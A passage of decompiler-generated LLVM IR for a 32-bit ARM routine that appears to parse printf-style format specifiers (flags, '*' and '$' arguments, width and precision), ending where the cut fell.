  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp111 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-107 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_150dc = load i32, i32* @r4, align 4
  store i32 %v3_150dc, i32* %stack_var_-36, align 4
  %v6_150dc = load i32, i32* @r5, align 4
  %v28_150dc = ptrtoint i32* %stack_var_-36 to i32
  %v0_150e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_150e0 = add i32 %v0_150e0, 16
  %v2_150e0 = inttoptr i32 %v1_150e0 to i32*
  %v3_150e0 = load i32, i32* %v2_150e0, align 4
  %v2_150e4 = ptrtoint i32* %stack_var_-108 to i32
  %v1_150e8 = and i32 %v3_150e0, 128
  store i32 %v1_150e8, i32* @r4, align 4
  %v2_150e8 = icmp eq i32 %v1_150e8, 0
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 %v0_150e0, i32* %r7.global-to-local, align 4
  %v1_15108 = add i32 %v0_150e0, 24
  %v2_15108 = inttoptr i32 %v1_15108 to i32*
  %v3_15108 = load i32, i32* %v2_15108, align 4
  store i32 %v3_15108, i32* %fp.global-to-local, align 4
  br i1 %v2_150e8, label %bb, label %dec_label_pc_15114

bb:                                               ; preds = %entry
  %v2_1510c = inttoptr i32 %v0_150e0 to i32*
  %v3_1510c = load i32, i32* %v2_1510c, align 4
  br label %dec_label_pc_1515c

dec_label_pc_15114:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15118

dec_label_pc_15118:                               ; preds = %dec_label_pc_15148.dec_label_pc_15118_crit_edge, %dec_label_pc_15114
  %v1_15128 = phi i32 [ %v1_15138, %dec_label_pc_15148.dec_label_pc_15118_crit_edge ], [ 0, %dec_label_pc_15114 ]
  %v0_15118 = phi i32 [ %v0_15118.pre, %dec_label_pc_15148.dec_label_pc_15118_crit_edge ], [ %v0_150e0, %dec_label_pc_15114 ]
  %v1_15118 = inttoptr i32 %v0_15118 to i32*
  %v2_15118 = load i32, i32* %v1_15118, align 4
  %v4_1511c = mul i32 %v1_15128, 4
  %v5_1511c = add i32 %v2_15118, %v4_1511c
  store i32 %v5_1511c, i32* %r3.global-to-local, align 4
  %v1_15120 = add i32 %v5_1511c, -1
  %v2_15120 = inttoptr i32 %v1_15120 to i8*
  %v3_15120 = load i8, i8* %v2_15120, align 1
  %v4_15120 = zext i8 %v3_15120 to i32
  store i32 %v4_15120, i32* %r1.global-to-local, align 4
  %v2_15128 = add i32 %v1_15128, %v28_150dc
  store i32 %v2_15128, i32* %r2.global-to-local, align 4
  %v3_1512c = add i32 %v2_15128, -72
  %v4_1512c = inttoptr i32 %v3_1512c to i8*
  store i8 %v3_15120, i8* %v4_1512c, align 1
  %v0_15130 = load i32, i32* %r3.global-to-local, align 4
  %v1_15130 = add i32 %v0_15130, -4
  %v2_15130 = inttoptr i32 %v1_15130 to i32*
  %v3_15130 = load i32, i32* %v2_15130, align 4
  store i32 %v3_15130, i32* %r3.global-to-local, align 4
  %v0_15134 = load i32, i32* %r1.global-to-local, align 4
  %v9_15134 = icmp eq i32 %v0_15134, %v3_15130
  %v0_15138 = load i32, i32* %r0.global-to-local, align 4
  %v1_15138 = add i32 %v0_15138, 1
  store i32 %v1_15138, i32* %r0.global-to-local, align 4
  br i1 %v9_15134, label %dec_label_pc_15140, label %dec_label_pc_155e8

dec_label_pc_15140:                               ; preds = %dec_label_pc_15118
  %v2_15140 = icmp eq i32 %v3_15130, 0
  br i1 %v2_15140, label %dec_label_pc_15150, label %dec_label_pc_15148

dec_label_pc_15148:                               ; preds = %dec_label_pc_15140
  %tmp172 = icmp ult i32 %v1_15138, 32
  br i1 %tmp172, label %dec_label_pc_15148.dec_label_pc_15118_crit_edge, label %dec_label_pc_15150

dec_label_pc_15148.dec_label_pc_15118_crit_edge:  ; preds = %dec_label_pc_15148
  %v0_15118.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15118

dec_label_pc_15150:                               ; preds = %dec_label_pc_15148, %dec_label_pc_15140
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_15158 = ptrtoint i32* %stack_var_-107 to i32
  br label %dec_label_pc_1515c

dec_label_pc_1515c:                               ; preds = %bb, %dec_label_pc_15150
  %storemerge108 = phi i32 [ %v2_15158, %dec_label_pc_15150 ], [ %v3_1510c, %bb ]
  store i32 %storemerge108, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  store i32 -4, i32* %sl.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_15178

dec_label_pc_15174:                               ; preds = %.thread19, %dec_label_pc_152ac
  %v0_15174 = phi i32 [ %v2_15324, %.thread19 ], [ %v0_1528872, %dec_label_pc_152ac ]
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.3, %.thread19 ], [ %stack_var_-40.2, %dec_label_pc_152ac ]
  store i32 %v0_15174, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15178

dec_label_pc_15178:                               ; preds = %dec_label_pc_1515c, %dec_label_pc_15174
  %v1_1518c = phi i32 [ %storemerge108, %dec_label_pc_1515c ], [ %v0_15174, %dec_label_pc_15174 ]
  %stack_var_-40.1 = phi i32 [ %tmp111, %dec_label_pc_1515c ], [ %stack_var_-40.0, %dec_label_pc_15174 ]
  %v1_15178 = inttoptr i32 %v1_1518c to i8*
  %v2_15178 = load i8, i8* %v1_15178, align 1
  %v3_15178 = zext i8 %v2_15178 to i32
  store i32 %v3_15178, i32* %r3.global-to-local, align 4
  %v7_1517c = icmp eq i8 %v2_15178, 42
  br i1 %v7_1517c, label %bb130, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_15178
  store i32 %v1_1518c, i32* %r6.global-to-local, align 4
  %v0_15190 = load i32, i32* @lr, align 4
  store i32 %v0_15190, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_151d8.preheader

bb130:                                            ; preds = %dec_label_pc_15178
  %v1_15184 = load i32, i32* %r5.global-to-local, align 4
  %v2_15184 = load i32, i32* %sl.global-to-local, align 4
  %v4_15184 = mul i32 %v2_15184, %v1_15184
  %v5_15184 = add i32 %v4_15184, %v28_150dc
  store i32 %v5_15184, i32* %r3.global-to-local, align 4
  %v2_1518c = add i32 %v1_1518c, 1
  store i32 %v2_1518c, i32* %r6.global-to-local, align 4
  %v0_15190104 = load i32, i32* @lr, align 4
  store i32 %v0_15190104, i32* %r1.global-to-local, align 4
  %v3_15194 = add i32 %v5_15184, -40
  %v4_15194 = inttoptr i32 %v3_15194 to i32*
  store i32 %v0_15190104, i32* %v4_15194, align 4
  %v0_151dc.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_151d8.preheader

dec_label_pc_151d8.preheader:                     ; preds = %.thread7, %bb130
  %v0_151dc.pre = phi i32 [ %v1_1518c, %.thread7 ], [ %v0_151dc.pre.pre, %bb130 ]
  %v2_151e0.pre = load i32, i32* @global_var_2e1e4, align 4
  br label %dec_label_pc_151d8

dec_label_pc_1519c:                               ; preds = %dec_label_pc_151d8
  store i32 214748363, i32* %r2.global-to-local, align 4
  %v0_151a0 = load i32, i32* %r1.global-to-local, align 4
  %v7_151a4 = icmp slt i32 %v0_151a0, 214748364
  br i1 %v7_151a4, label %dec_label_pc_151bc, label %dec_label_pc_151a8

dec_label_pc_151a8:                               ; preds = %dec_label_pc_1519c
  store i32 214748364, i32* %r3.global-to-local, align 4
  %v9_151ac = icmp eq i32 %v0_151a0, 214748364
  br i1 %v9_151ac, label %dec_label_pc_151b4, label %dec_label_pc_151d4

dec_label_pc_151b4:                               ; preds = %dec_label_pc_151a8
  %v8_151b8 = icmp ugt i8 %v2_151dc, 55
  br i1 %v8_151b8, label %dec_label_pc_151d4, label %dec_label_pc_151bc

dec_label_pc_151bc:                               ; preds = %dec_label_pc_151b4, %dec_label_pc_1519c
  %v2_151c0 = mul i32 %v0_151a0, 10
  %v1_151c4 = add i32 %v2_151c0, -48
  store i32 %v1_151c4, i32* %r3.global-to-local, align 4
  %v2_151c8 = add i32 %v1_151c4, %v3_151dc
  br label %dec_label_pc_151d4

dec_label_pc_151d4:                               ; preds = %dec_label_pc_151b4, %dec_label_pc_151a8, %dec_label_pc_151bc
  %storemerge = phi i32 [ %v2_151c8, %dec_label_pc_151bc ], [ 2147483647, %dec_label_pc_151a8 ], [ 2147483647, %dec_label_pc_151b4 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_151d4 = add i32 %v0_15260, 1
  store i32 %v1_151d4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_151d8

dec_label_pc_151d8:                               ; preds = %dec_label_pc_151d8.preheader, %dec_label_pc_151d4
  %v0_15260 = phi i32 [ %v0_151dc.pre, %dec_label_pc_151d8.preheader ], [ %v1_151d4, %dec_label_pc_151d4 ]
  store i32 ptrtoint (i32* @global_var_2e1e4 to i32), i32* %r2.global-to-local, align 4
  %v1_151dc = inttoptr i32 %v0_15260 to i8*
  %v2_151dc = load i8, i8* %v1_151dc, align 1
  %v3_151dc = zext i8 %v2_151dc to i32
  store i32 %v2_151e0.pre, i32* %r3.global-to-local, align 4
  %v2_151e4 = mul nuw nsw i32 %v3_151dc, 2
  %v2_151e8 = add i32 %v2_151e4, %v2_151e0.pre
  store i32 %v2_151e8, i32* %r2.global-to-local, align 4
  %v1_151ec = add i32 %v2_151e8, 1
  %v2_151ec = inttoptr i32 %v1_151ec to i8*
  %v3_151ec = load i8, i8* %v2_151ec, align 1
  %v4_151ec = zext i8 %v3_151ec to i32
  store i32 %v4_151ec, i32* %r3.global-to-local, align 4
  %v1_151f0 = and i32 %v4_151ec, 8
  %v2_151f0 = icmp eq i32 %v1_151f0, 0
  br i1 %v2_151f0, label %dec_label_pc_151f8, label %dec_label_pc_1519c

dec_label_pc_151f8:                               ; preds = %dec_label_pc_151d8
  %v0_151f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_151f8 = add i32 %v0_151f8, -1
  %v2_151f8 = inttoptr i32 %v1_151f8 to i8*
  %v3_151f8 = load i8, i8* %v2_151f8, align 1
  %v4_151f8 = zext i8 %v3_151f8 to i32
  store i32 %v4_151f8, i32* %r3.global-to-local, align 4
  %v7_151fc = icmp eq i8 %v3_151f8, 37
  br i1 %v7_151fc, label %dec_label_pc_15204, label %dec_label_pc_152c4

dec_label_pc_15204:                               ; preds = %dec_label_pc_151f8
  %v7_15204 = icmp eq i8 %v2_151dc, 36
  %. = zext i1 %v7_15204 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %v0_15210 = load i32, i32* %r1.global-to-local, align 4
  %tmp135 = icmp slt i32 %v0_15210, 1
  br i1 %tmp135, label %bb136, label %thread-pre-split

bb136:                                            ; preds = %dec_label_pc_15204
  store i32 0, i32* %r3.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_15204, %bb136
  %v0_15218 = phi i32 [ 0, %bb136 ], [ %., %dec_label_pc_15204 ]
  %v2_15218 = icmp eq i32 %v0_15218, 0
  %v0_1524c = load i32, i32* %fp.global-to-local, align 4
  br i1 %v2_15218, label %dec_label_pc_1524c, label %dec_label_pc_15220

dec_label_pc_15220:                               ; preds = %thread-pre-split
  %v2_1524c = icmp eq i32 %v0_1524c, 0
  %v1_15224 = add i32 %v0_15260, 1
  store i32 %v1_15224, i32* %r0.global-to-local, align 4
  br i1 %v2_1524c, label %dec_label_pc_155e8, label %dec_label_pc_1522c

dec_label_pc_1522c:                               ; preds = %dec_label_pc_15220
  %v2_1522c = sub i32 %v0_15210, %v0_1524c
  %v4_1522c = xor i32 %v0_1524c, %v0_15210
  %v5_1522c = xor i32 %v2_1522c, %v0_15210
  %v6_1522c = and i32 %v5_1522c, %v4_1522c
  %v7_1522c = icmp slt i32 %v6_1522c, 0
  %v8_1522c = icmp slt i32 %v2_1522c, 0
  %v9_1522c = icmp eq i32 %v0_15210, %v0_1524c
  %v3_15230 = xor i1 %v8_1522c, %v7_1522c
  %v4_15230 = or i1 %v9_1522c, %v3_15230
  br i1 %v4_15230, label %dec_label_pc_15240, label %bb137

bb137:                                            ; preds = %dec_label_pc_1522c
  store i32 %v0_15210, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15240

dec_label_pc_1523c:                               ; preds = %dec_label_pc_15260, %dec_label_pc_15268
  %v0_1523c = load i32, i32* @lr, align 4
  store i32 %v0_1523c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15240

dec_label_pc_15240:                               ; preds = %bb137, %dec_label_pc_1522c, %dec_label_pc_1523c
  %v0_15240 = phi i32 [ %v0_151f8, %dec_label_pc_1523c ], [ %v1_15224, %dec_label_pc_1522c ], [ %v1_15224, %bb137 ]
  %stack_var_-40.2 = phi i32 [ %stack_var_-40.1, %dec_label_pc_1523c ], [ %v0_15210, %dec_label_pc_1522c ], [ %v0_15210, %bb137 ]
  br label %dec_label_pc_1527c

dec_label_pc_1524c:                               ; preds = %thread-pre-split
  %tmp138 = icmp slt i32 %v0_1524c, 1
  br i1 %tmp138, label %dec_label_pc_15260, label %dec_label_pc_15254

dec_label_pc_15254:                               ; preds = %dec_label_pc_1524c
  %v7_15254 = icmp eq i8 %v2_151dc, 109
  br i1 %v7_15254, label %dec_label_pc_152c4, label %dec_label_pc_155e8

dec_label_pc_15260:                               ; preds = %dec_label_pc_1524c
  %tmp173 = icmp ugt i32 %v0_15260, %v0_151f8
  br i1 %tmp173, label %dec_label_pc_15268, label %dec_label_pc_1523c

dec_label_pc_15268:                               ; preds = %dec_label_pc_15260
  %v1_15268 = inttoptr i32 %v0_151f8 to i8*
  %v2_15268 = load i8, i8* %v1_15268, align 1
  %v3_15268 = zext i8 %v2_15268 to i32
  store i32 %v3_15268, i32* %r3.global-to-local, align 4
  %v7_1526c = icmp eq i8 %v2_15268, 48
  br i1 %v7_1526c, label %dec_label_pc_1523c, label %bb139

bb139:                                            ; preds = %dec_label_pc_15268
  %v1_15270 = load i32, i32* @lr, align 4
  store i32 %v1_15270, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_152c4

dec_label_pc_1527c.loopexit:                      ; preds = %dec_label_pc_15284
  %v1_15290 = load i32, i32* @r4, align 4
  %v3_15290 = or i32 %v1_15290, %v0_152a4
  store i32 %v3_15290, i32* @r4, align 4
  %v2_15294 = add i32 %v0_1528872, 1
  br label %dec_label_pc_1527c

dec_label_pc_1527c:                               ; preds = %dec_label_pc_1527c.loopexit, %dec_label_pc_15240
  %storemerge171 = phi i32 [ %v0_15240, %dec_label_pc_15240 ], [ %v2_15294, %dec_label_pc_1527c.loopexit ]
  %v0_1528872 = phi i32 [ %v0_15240, %dec_label_pc_15240 ], [ %v2_15294, %dec_label_pc_1527c.loopexit ]
  store i32 %storemerge171, i32* %r6.global-to-local, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_24720.1362 to i32), i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_15288 = inttoptr i32 %v0_1528872 to i8*
  br label %dec_label_pc_15284

dec_label_pc_15284:                               ; preds = %dec_label_pc_1529c, %dec_label_pc_1527c
  %v0_152a4 = phi i32 [ %v2_152a4, %dec_label_pc_1529c ], [ 1, %dec_label_pc_1527c ]
  %v0_15284 = phi i32 [ %v5_15284, %dec_label_pc_1529c ], [ ptrtoint ([8 x i8]* @global_var_24720.1362 to i32), %dec_label_pc_1527c ]
  %v1_15284 = inttoptr i32 %v0_15284 to i8*
  %v2_15284 = load i8, i8* %v1_15284, align 1
  %v3_15284 = zext i8 %v2_15284 to i32
  store i32 %v3_15284, i32* %r2.global-to-local, align 4
  %v5_15284 = add i32 %v0_15284, 1
  store i32 %v5_15284, i32* %r0.global-to-local, align 4
  %v2_15288 = load i8, i8* %v1_15288, align 1
  %v3_15288 = zext i8 %v2_15288 to i32
  store i32 %v3_15288, i32* %r3.global-to-local, align 4
  %v9_1528c = icmp eq i8 %v2_15288, %v2_15284
  br i1 %v9_1528c, label %dec_label_pc_1527c.loopexit, label %dec_label_pc_1529c

dec_label_pc_1529c:                               ; preds = %dec_label_pc_15284
  %v1_1529c = inttoptr i32 %v5_15284 to i8*
  %v2_1529c = load i8, i8* %v1_1529c, align 1
  %v3_1529c = zext i8 %v2_1529c to i32
  store i32 %v3_1529c, i32* %r3.global-to-local, align 4
  %v2_152a0 = icmp eq i8 %v2_1529c, 0
  %v2_152a4 = mul i32 %v0_152a4, 2
  store i32 %v2_152a4, i32* %r1.global-to-local, align 4
  br i1 %v2_152a0, label %dec_label_pc_152ac, label %dec_label_pc_15284

dec_label_pc_152ac:                               ; preds = %dec_label_pc_1529c
  %v1_152ac = add i32 %v0_1528872, -1
  %v2_152ac = inttoptr i32 %v1_152ac to i8*
  %v3_152ac = load i8, i8* %v2_152ac, align 1
  %v7_152b0 = icmp eq i8 %v3_152ac, 37
  %v0_152b4 = load i32, i32* @r4, align 4
  %v1_152b4 = and i32 %v0_152b4, 10
  store i32 %v1_152b4, i32* %r3.global-to-local, align 4
  %v4_152b8 = udiv i32 %v1_152b4, 2
  %v5_152b8 = sub nuw nsw i32 -1, %v4_152b8
  %v6_152b8 = and i32 %v0_152b4, %v5_152b8
  store i32 %v6_152b8, i32* @r4, align 4
  br i1 %v7_152b0, label %dec_label_pc_152c0, label %dec_label_pc_15174

dec_label_pc_152c0:                               ; preds = %dec_label_pc_152ac
  %v0_152c0 = load i32, i32* @lr, align 4
  store i32 %v0_152c0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_152c4

dec_label_pc_152c4:                               ; preds = %bb139, %dec_label_pc_151f8, %dec_label_pc_15254, %dec_label_pc_152c0
  %v1_15304 = phi i32 [ %v0_1528872, %dec_label_pc_152c0 ], [ %v0_15260, %bb139 ], [ %v0_15260, %dec_label_pc_15254 ], [ %v0_15260, %dec_label_pc_151f8 ]
  %v0_15300 = phi i32 [ %v5_15284, %dec_label_pc_152c0 ], [ %v0_151f8, %bb139 ], [ %v0_151f8, %dec_label_pc_15254 ], [ %v0_151f8, %dec_label_pc_151f8 ]
  %stack_var_-40.3 = phi i32 [ %stack_var_-40.2, %dec_label_pc_152c0 ], [ %stack_var_-40.1, %bb139 ], [ %stack_var_-40.1, %dec_label_pc_15254 ], [ %stack_var_-40.1, %dec_label_pc_151f8 ]
  %v1_152c4 = inttoptr i32 %v0_15300 to i8*
  %v2_152c4 = load i8, i8* %v1_152c4, align 1
  %v3_152c4 = zext i8 %v2_152c4 to i32
  store i32 %v3_152c4, i32* %r3.global-to-local, align 4
  %v7_152c8 = icmp eq i8 %v2_152c4, 42
  br i1 %v7_152c8, label %dec_label_pc_152d0, label %dec_label_pc_15310

dec_label_pc_152d0:                               ; preds = %dec_label_pc_152c4
  %v0_152d0 = load i32, i32* %fp.global-to-local, align 4
  %v2_152d0 = icmp eq i32 %v0_152d0, 0
  br i1 %v2_152d0, label %dec_label_pc_15300, label %dec_label_pc_152d8

dec_label_pc_152d8:                               ; preds = %dec_label_pc_152d0
  %v1_152d8 = inttoptr i32 %v1_15304 to i8*
  %v2_152d8 = load i8, i8* %v1_152d8, align 1
  %v3_152d8 = zext i8 %v2_152d8 to i32
  store i32 %v3_152d8, i32* %r3.global-to-local, align 4
  %v7_152dc = icmp eq i8 %v2_152d8, 36
  br i1 %v7_152dc, label %dec_label_pc_152e4, label %dec_label_pc_155e8

dec_label_pc_152e4:                               ; preds = %dec_label_pc_152d8
  %v0_152e4 = load i32, i32* %r1.global-to-local, align 4
  %tmp140 = icmp slt i32 %v0_152e4, 1
  br i1 %tmp140, label %dec_label_pc_155e8, label %dec_label_pc_152ec

dec_label_pc_152ec:                               ; preds = %dec_label_pc_152e4
  %v0_152f0 = load i32, i32* %r5.global-to-local, align 4
  %v1_152f0 = load i32, i32* %sl.global-to-local, align 4
  %v3_152f0 = mul i32 %v1_152f0, %v0_152f0
  %v4_152f0 = add i32 %v3_152f0, %v28_150dc
  store i32 %v4_152f0, i32* %r3.global-to-local, align 4
  %v1_152f4 = add i32 %v1_15304, 1
  store i32 %v1_152f4, i32* %r6.global-to-local, align 4
  %v2_152f8 = add i32 %v4_152f0, -12
  %v3_152f8 = inttoptr i32 %v2_152f8 to i32*
  store i32 %v0_152e4, i32* %v3_152f8, align 4
  br label %dec_label_pc_1530c

dec_label_pc_15300:                               ; preds = %dec_label_pc_152d0
  %v1_15300 = add i32 %v0_15300, 1
  store i32 %v1_15300, i32* %r3.global-to-local, align 4
  %v9_15304 = icmp eq i32 %v1_15300, %v1_15304
  br i1 %v9_15304, label %dec_label_pc_1530c, label %dec_label_pc_155e8

dec_label_pc_1530c:                               ; preds = %dec_label_pc_15300, %dec_label_pc_152ec
  store i32 -2147483648, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15310

dec_label_pc_15310:                               ; preds = %dec_label_pc_152c4, %dec_label_pc_1530c
  %v0_15310 = load i32, i32* %r5.global-to-local, align 4
  %v2_15310 = icmp eq i32 %v0_15310, 0
  br i1 %v2_15310, label %dec_label_pc_1531c, label %dec_label_pc_1533c.loopexit

dec_label_pc_1531c:                               ; preds = %dec_label_pc_15310
  %v0_1531c = load i32, i32* %r6.global-to-local, align 4
  %v1_1531c = inttoptr i32 %v0_1531c to i8*
  %v2_1531c = load i8, i8* %v1_1531c, align 1
  %v3_1531c = zext i8 %v2_1531c to i32
  store i32 %v3_1531c, i32* %r3.global-to-local, align 4
  %v7_15320 = icmp eq i8 %v2_1531c, 46
  br i1 %v7_15320, label %.thread19, label %dec_label_pc_15334

.thread19:                                        ; preds = %dec_label_pc_1531c
  %v2_15324 = add i32 %v0_1531c, 1
  store i32 %v2_15324, i32* %r6.global-to-local, align 4
  %v1_15328 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_15328, i32* %r8.global-to-local, align 4
  %v1_1532c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v1_1532c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15174

dec_label_pc_15334:                               ; preds = %dec_label_pc_1531c
  %v0_15334 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_15334, i32* %r8.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  br label %dec_label_pc_1533c

dec_label_pc_1533c.loopexit:                      ; preds = %dec_label_pc_15310
  %v1_15314 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_15314, i32* @r5, align 4
  %v0_15344.pre.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1533c

dec_label_pc_1533c:                               ; preds = %dec_label_pc_1533c.loopexit, %dec_label_pc_15334
  %v0_15344.pre = phi i32 [ %v0_15344.pre.pre, %dec_label_pc_1533c.loopexit ], [ %v0_1531c, %dec_label_pc_15334 ]
  store i32 ptrtoint ([9 x i8]* @global_var_246a4.1364 to i32), i32* %r1.global-to-local, align 4
  %v1_15344 = inttoptr i32 %v0_15344.pre to i8*
  br label %dec_label_pc_15340

dec_label_pc_15340:                               ; preds = %dec_label_pc_15354, %dec_label_pc_1533c
  %v0_15354 = phi i32 [ %v1_15354, %dec_label_pc_15354 ], [ ptrtoint ([9 x i8]* @global_var_246a4.1364 to i32), %dec_label_pc_1533c ]
  %v1_15340 = inttoptr i32 %v0_15354 to i8*
  %v2_15340 = load i8, i8* %v1_15340, align 1
  %v3_15340 = zext i8 %v2_15340 to i32
  store i32 %v3_15340, i32* %r2.global-to-local, align 4
  %v2_15344 = load i8, i8* %v1_15344, align 1
  %v3_15344 = zext i8 %v2_15344 to i32
  store i32 %v3_15344, i32* %r3.global-to-local, align 4
  %v9_15348 = icmp eq i8 %v2_15344, %v2_15340
  br i1 %v9_15348, label %bb141, label %dec_label_pc_15354

bb141:                                            ; preds = %dec_label_pc_15340
  %v2_1534c = add i32 %v0_15344.pre, 1
  store i32 %v2_1534c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15360

dec_label_pc_15354:                               ; preds = %dec_label_pc_15340
  %v1_15354 = add i32 %v0_15354, 1
  %v2_15354 = inttoptr i32 %v1_15354 to i8*
  %v3_15354 = load i8, i8* %v2_15354, align 1
  %v4_15354 = zext i8 %v3_15354 to i32
  store i32 %v4_15354, i32* %r3.global-to-local, align 4
  store i32 %v1_15354, i32* %r1.global-to-local, align 4
  %v2_15358 = icmp eq i8 %v3_15354, 0
  br i1 %v2_15358, label %dec_label_pc_15360, label %dec_label_pc_15340

dec_label_pc_15360:                               ; preds = %dec_label_pc_15354, %bb141
  %v1_15380 = phi i32 [ %v2_1534c, %bb141 ], [ %v0_15344.pre, %dec_label_pc_15354 ]
  %v1_1537c = phi i32 [ %v0_15354, %bb141 ], [ %v1_15354, %dec_label_pc_15354 ]
  %v2_15364 = sub i32 %v1_1537c, ptrtoint ([9 x i8]* @global_var_246a4.1364 to i32)
  store i32 %v2_15364, i32* %r3.global-to-local, align 4
  %v8_1536c = icmp sgt i32 %v2_15364, 1
  br i1 %v8_1536c, label %.thread23, label %dec_label_pc_15370

dec_label_pc_15370:                               ; preds = %dec_label_pc_15360
  %v1_15370 = inttoptr i32 %v1_15380 to i8*
  %v2_15370 = load i8, i8* %v1_15370, align 1
  %v3_15370 = zext i8 %v2_15370 to i32
  store i32 %v3_15370, i32* %r2.global-to-local, align 4
  %v1_15374 = inttoptr i32 %v1_1537c to i8*
  %v2_15374 = load i8, i8* %v1_15374, align 1
  %v3_15374 = zext i8 %v2_15374 to i32
  store i32 %v3_15374, i32* %r3.global-to-local, align 4
  %v9_15378 = icmp eq i8 %v2_15370, %v2_15374
  br i1 %v9_15378, label %bb142, label %.thread23

bb142:                                            ; preds = %dec_label_pc_15370
  %v2_1537c = add i32 %v1_1537c, 9
  store i32 %v2_1537c, i32* %r1.global-to-local, align 4
  %v2_15380 = add i32 %v1_15380, 1
  store i32 %v2_15380, i32* %r6.global-to-local, align 4
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_15370, %dec_label_pc_15360, %bb142
  %v0_15388 = phi i32 [ %v1_1537c, %dec_label_pc_15370 ], [ %v1_1537c, %dec_label_pc_15360 ], [ %v2_1537c, %bb142 ]
  %v0_15384 = phi i32 [ %v1_15380, %dec_label_pc_15370 ], [ %v1_15380, %dec_label_pc_15360 ], [ %v2_15380, %bb142 ]
  %v1_15384 = inttoptr i32 %v0_15384 to i8*
  %v2_15384 = load i8, i8* %v1_15384, align 1
  %v3_15384 = zext i8 %v2_15384 to i32
  store i32 %v3_15384, i32* %r2.global-to-local, align 4
  %v1_15388 = add i32 %v0_15388, 9
  %v2_15388 = inttoptr i32 %v1_15388 to i8*
  %v3_15388 = load i8, i8* %v2_15388, align 1
  %v4_15388 = zext i8 %v3_15388 to i32
  store i32 %v4_15388, i32* %r3.global-to-local, align 4
  %v2_1538c = icmp eq i8 %v2_15384, 0
  %v3_15390 = mul nuw nsw i32 %v4_15388, 256
  store i32 %v3_15390, i32* @lr, align 4
  br i1 %v2_1538c, label %dec_label_pc_155e8, label %dec_label_pc_15398

dec_label_pc_15398:                               ; preds = %.thread23
  store i32 ptrtoint ([21 x i8]* @global_var_24708.1366 to i32), i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1539c

dec_label_pc_1539c:                               ; preds = %dec_label_pc_15424, %dec_label_pc_15398
  %v1_153ac = phi i32 [ %v1_15424, %dec_label_pc_15424 ], [ ptrtoint ([21 x i8]* @global_var_24708.1366 to i32), %dec_label_pc_15398 ]
  %v1_1539c = inttoptr i32 %v1_153ac to i8*
  %v2_1539c = load i8, i8* %v1_1539c, align 1
  %v3_1539c = zext i8 %v2_1539c to i32
  store i32 %v3_1539c, i32* %r3.global-to-local, align 4
  %v9_153a0 = icmp eq i8 %v2_1539c, %v2_15384
  br i1 %v9_153a0, label %dec_label_pc_153a8, label %dec_label_pc_15424

dec_label_pc_153a8:                               ; preds = %dec_label_pc_1539c
  store i32 ptrtoint ([21 x i8]* @global_var_24708.1366 to i32), i32* %r3.global-to-local, align 4
  %v2_153ac = sub i32 %v1_153ac, ptrtoint ([21 x i8]* @global_var_24708.1366 to i32)
  store i32 %v2_153ac, i32* %r2.global-to-local, align 4
  %v7_153b4 = icmp slt i32 %v2_153ac, 18
  br i1 %v7_153b4, label %bb144, label %dec_label_pc_153b8

dec_label_pc_153b8:                               ; preds = %dec_label_pc_153a8
  %v1_153b8 = and i32 %v3_15390, 1024
  %v2_153b8 = icmp eq i32 %v1_153b8, 0
  br i1 %v2_153b8, label %bb144, label %bb143

bb143:                                            ; preds = %dec_label_pc_153b8
  %v2_153bc = add i32 %v2_153ac, -2
  store i32 %v2_153bc, i32* %r2.global-to-local, align 4
  br label %bb144

bb144:                                            ; preds = %dec_label_pc_153a8, %dec_label_pc_153b8, %bb143
  %v0_153c0 = phi i32 [ %v2_153ac, %dec_label_pc_153a8 ], [ %v2_153ac, %dec_label_pc_153b8 ], [ %v2_153bc, %bb143 ]
  %v1_153c0 = load i32, i32* %r7.global-to-local, align 4
  %v2_153c0 = add i32 %v1_153c0, 32
  %v3_153c0 = inttoptr i32 %v2_153c0 to i32*
  store i32 %v0_153c0, i32* %v3_153c0, align 4
  store i32 ptrtoint (i32* @global_var_246d7.1368 to i32), i32* %r1.global-to-local, align 4
  %v0_153cc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_153c8

dec_label_pc_153c8:                               ; preds = %dec_label_pc_153c8, %bb144
